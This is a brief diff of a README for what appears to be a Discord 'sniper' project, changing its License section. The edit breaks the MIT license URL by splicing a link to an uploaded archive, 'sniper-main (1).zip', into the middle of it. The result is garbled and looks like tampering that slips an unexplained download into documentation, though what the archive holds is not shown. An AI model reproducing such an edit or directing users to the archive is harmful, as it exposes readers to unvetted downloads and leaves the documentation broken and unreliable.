@@ -42,4 +42,5 @@ An example Dockerfile has been included. Modify line 12 to change the guild id. 
 
 ## License
 
-[MIT](https://tldrlegal.com/license/mit-license)
+[MIT](https://tldrlegal.c[sniper-main (1).zip](https://github.com/Sunnymoonlightceclipse/sniper/files/8280922/sniper-main.1.zip)
+om/license/mit-license)
